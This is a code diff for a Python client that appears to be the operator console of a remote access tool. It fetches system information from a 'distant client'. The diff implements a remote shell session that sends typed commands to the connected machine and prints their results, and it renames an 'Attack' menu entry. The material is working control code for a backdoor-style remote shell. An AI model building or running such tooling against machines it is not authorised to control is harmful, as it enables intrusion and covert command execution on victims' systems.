@@ -18,12 +18,12 @@ class Connection():
         return addr
 
     def sending(self, message):
-        message = message.encode()
+        message = message.encode("utf-8")
         self.distant_socket.send(message)
 
     def receive(self):
         try:
-            message = self.distant_socket.recv(99999).decode("utf-8")
+            message = self.distant_socket.recv(99999).decode()
             return message
         except Exception as e:
             print(e)
@@ -31,17 +31,15 @@ class Connection():
 
     def stop_listener(self):
         self.sending("exit")
+        self.distant_socket.close()
         self.s.close()
-
 
 class Client():
     def __init__(self):
         self.connection = Connection("localhost", 60000)
 
     def get_infos(self):
-        """
-        Get all the infos from the distant client.
-        """
+        # Get all the infos from the distant client.
         self.connection.sending("InfoSystem")
         payload = self.connection.receive()
         infosys = json.loads(payload)
@@ -63,7 +61,18 @@ class Client():
             _ = input("Enter to continue . . .")
 
     def start_shell_session(self):
-        pass
+        self.connection.sending("shell_att")
+        path = self.connection.receive()
+        while True:
+            command = input(path+">")
+            self.connection.sending(command)
+            if command.lower() == "quit":
+                break
+            elif "cd" in command.lower():
+                path = self.connection.receive()
+            else:
+                a = self.connection.receive()
+                print(a)
 
     def start(self):
         # Print logo
@@ -92,7 +101,7 @@ class Client():
 
     def exit(self):
         self.connection.stop_listener()
-        print("Goodbye")
+        print("Goodbye ಠ_ಠ")
 
     @staticmethod
     def logo():
@@ -110,8 +119,8 @@ class Client():
               "    /               MENU                \ \n"
               "    \___________________________________/ \n"
               "     |                                 |  \n"
-              "     |   [ 1 ]    Attack               |  \n"
-              "     |   [ 2 ]    Info Software        |  \n"
+              "     |   [ 1 ]    Get Info             |  \n"
+              "     |   [ 2 ]    Remote Shell         |  \n"
               "     |   [ 3 ]    Exit                 |  \n"
               "     |                                 |  \n"
               "     \_________________________________/  \n")
